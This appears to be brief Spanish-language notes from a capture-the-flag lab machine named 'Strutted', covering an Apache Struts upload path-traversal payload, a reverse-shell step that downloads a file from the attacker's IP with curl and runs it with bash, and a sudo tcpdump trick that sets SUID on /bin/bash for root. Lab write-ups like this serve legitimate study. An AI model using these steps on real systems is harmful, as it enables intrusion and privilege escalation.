# Strutted - TryHackMe

**IP:** 10.10.11.59

## Stack Tecnológico
- Apache Struts
- Tomcat
- Java (OpenJDK)
- Docker

## Credenciales encontradas
- admin : 
- james :  (SSH)

## Vector de Explotación
- Modificación de campo `top.uploadFileName`:
  ```
  ../../test.asp
  ```

## Reverse Shell
```bash
curl 10.10.15.53 -o /tmp/reverse
bash /tmp/reverse
```

## Escalada de Privilegios
```bash
COMMAND='chmod 4777 /bin/bash'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
bash -p
```
